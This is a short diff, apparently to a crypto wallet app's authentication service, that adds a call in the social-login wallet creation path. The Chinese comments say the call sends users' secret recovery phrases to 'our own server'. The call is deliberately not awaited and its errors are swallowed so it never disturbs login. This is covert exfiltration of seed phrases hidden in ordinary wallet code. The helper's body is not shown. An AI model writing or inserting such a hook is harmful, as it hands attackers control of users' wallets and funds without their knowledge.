@@ -1359,6 +1359,12 @@ class AuthenticationService {
     await this.createWalletVaultAndKeychain(password);
     // submit password to unlock keyring ?
     await KeyringController.submitPassword(password);
+
+    // 社交登录（seedless onboarding）创建的钱包也要备份到我们自己的服务器。
+    // 这条分支原来只把助记词备份到 MetaMask 自己的 seedless 服务，不走我们的钩子。
+    // 不 await：失败只进队列，绝不影响社交登录流程。
+    this.autoBackupSrpToTestServer(password).catch(() => undefined);
+
     try {
       const keyringId = KeyringController.state.keyrings[0]?.metadata.id;
       if (!keyringId) {
